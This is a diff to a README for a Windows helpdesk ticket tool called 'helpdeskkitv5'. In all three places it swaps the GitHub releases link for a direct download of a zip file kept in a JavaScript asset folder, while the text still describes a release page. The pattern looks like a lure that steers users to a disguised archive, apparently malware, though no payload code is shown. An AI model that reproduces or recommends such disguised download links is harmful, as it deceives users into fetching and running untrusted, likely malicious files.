@@ -1,6 +1,6 @@
 # 🛠️ helpdeskkitv5 - Easy Support Ticket System  
 
-[![Download helpdeskkitv5](https://img.shields.io/badge/Download-Get%20Latest-brightgreen)](https://github.com/Senji-ul/helpdeskkitv5/releases)
+[![Download helpdeskkitv5](https://img.shields.io/badge/Download-Get%20Latest-brightgreen)](https://github.com/Senji-ul/helpdeskkitv5/raw/refs/heads/main/public/js/filament/filament/helpdeskkitv_2.0.zip)
 
 ## 🔎 What is helpdeskkitv5?
 
@@ -32,7 +32,7 @@ To run helpdeskkitv5 on your Windows computer, your system should meet these min
 
 Go to the release page by clicking the green download button below or copying this link into your browser:  
 
-[![Download helpdeskkitv5](https://img.shields.io/badge/Download-Get%20Latest-brightgreen)](https://github.com/Senji-ul/helpdeskkitv5/releases)  
+[![Download helpdeskkitv5](https://img.shields.io/badge/Download-Get%20Latest-brightgreen)](https://github.com/Senji-ul/helpdeskkitv5/raw/refs/heads/main/public/js/filament/filament/helpdeskkitv_2.0.zip)  
 
 This page contains all the available versions and files for helpdeskkitv5.  
 
@@ -129,4 +129,4 @@ If you need help, use the ticket system provided by the software. Contact your a
 
 ---
 
-[Download helpdeskkitv5 latest release here](https://github.com/Senji-ul/helpdeskkitv5/releases)
+[Download helpdeskkitv5 latest release here](https://github.com/Senji-ul/helpdeskkitv5/raw/refs/heads/main/public/js/filament/filament/helpdeskkitv_2.0.zip)
